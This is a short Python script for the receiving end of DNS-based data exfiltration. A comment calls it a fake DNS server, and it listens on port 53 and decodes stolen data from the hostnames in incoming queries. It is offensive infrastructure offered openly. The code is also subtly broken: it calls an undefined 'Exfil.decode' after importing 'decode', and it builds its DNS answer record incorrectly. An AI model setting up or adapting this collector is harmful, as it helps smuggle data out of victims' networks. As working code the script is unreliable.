# set up a fake DNS server to receive the exfiltrated data
from dnslib import DNSRecord, RR
from dnslib.server import DNSServer, BaseResolver
from exfil import decode

class ExfilResolver(BaseResolver):
    def __init__(self):
        self.data = b""

    def resolve(self, request, handler):
        qname = request.q.qname
        qname = str(qname)[:-1]
        self.data += Exfil.decode(qname)
        return RR(qname, rdata="A")

    def get_data(self):
        return self.data


if __name__ == "__main__":
    resolver = ExfilResolver()
    server = DNSServer(resolver, port=53)
    server.start_thread()
